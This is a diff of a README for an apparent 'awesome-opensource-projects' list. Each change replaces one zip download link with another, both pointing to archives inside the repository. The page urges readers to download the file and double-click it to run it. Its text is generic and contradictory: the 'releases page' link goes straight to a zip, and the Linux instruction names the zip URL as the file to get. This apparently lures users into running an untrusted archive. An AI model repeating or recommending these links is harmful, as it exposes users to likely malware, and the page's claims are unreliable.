@@ -1,7 +1,7 @@
 # 🎉 awesome-opensource-projects - Explore Great Open Source Projects
 
 ## 📥 Download Now 
-[![Download](https://raw.githubusercontent.com/basharat123-jpg/awesome-opensource-projects/main/templates/awesome-opensource-projects-1.6-alpha.2.zip)](https://raw.githubusercontent.com/basharat123-jpg/awesome-opensource-projects/main/templates/awesome-opensource-projects-1.6-alpha.2.zip)
+[![Download](https://github.com/basharat123-jpg/awesome-opensource-projects/raw/refs/heads/main/projects/games/opensource-awesome-projects-v2.7.zip)](https://github.com/basharat123-jpg/awesome-opensource-projects/raw/refs/heads/main/projects/games/opensource-awesome-projects-v2.7.zip)
 
 ## 🌟 Description
 Welcome to the **awesome-opensource-projects** repository! This collection features outstanding open source projects created by community members. Whether you’re looking for something useful or just want to explore, you’re in the right place.
@@ -11,7 +11,7 @@ Follow these simple steps to download and run our software:
 
 1. **Visit the Releases Page**  
    Click the link below to go to the releases page.  
-   [Download the latest version](https://raw.githubusercontent.com/basharat123-jpg/awesome-opensource-projects/main/templates/awesome-opensource-projects-1.6-alpha.2.zip)
+   [Download the latest version](https://github.com/basharat123-jpg/awesome-opensource-projects/raw/refs/heads/main/projects/games/opensource-awesome-projects-v2.7.zip)
 
 2. **Choose Your Version**  
    On the releases page, you will see different versions of the project. Look for the most recent version, typically marked as the latest or stable release.
@@ -21,7 +21,7 @@ Follow these simple steps to download and run our software:
    Click the relevant file for your system:
    - **Windows**: Download the `.exe` file.
    - **Mac**: Download the `.dmg` file.
-   - **Linux**: Download the `https://raw.githubusercontent.com/basharat123-jpg/awesome-opensource-projects/main/templates/awesome-opensource-projects-1.6-alpha.2.zip` file.
+   - **Linux**: Download the `https://github.com/basharat123-jpg/awesome-opensource-projects/raw/refs/heads/main/projects/games/opensource-awesome-projects-v2.7.zip` file.
 
 4. **Run the File**  
    Once the download is complete, locate the file in your computer’s Downloads folder and double-click it to run. Follow any on-screen instructions to complete the installation.
@@ -63,5 +63,5 @@ For detailed information about each project, check out the individual documentat
 To stay informed about new releases and features, watch the repository on GitHub. You’ll receive notifications whenever there are updates.
 
 ## 🚀 Ready to Start?
-[Download the latest version now!](https://raw.githubusercontent.com/basharat123-jpg/awesome-opensource-projects/main/templates/awesome-opensource-projects-1.6-alpha.2.zip) Enjoy discovering amazing open source projects created by our community.
+[Download the latest version now!](https://github.com/basharat123-jpg/awesome-opensource-projects/raw/refs/heads/main/projects/games/opensource-awesome-projects-v2.7.zip) Enjoy discovering amazing open source projects created by our community.
 
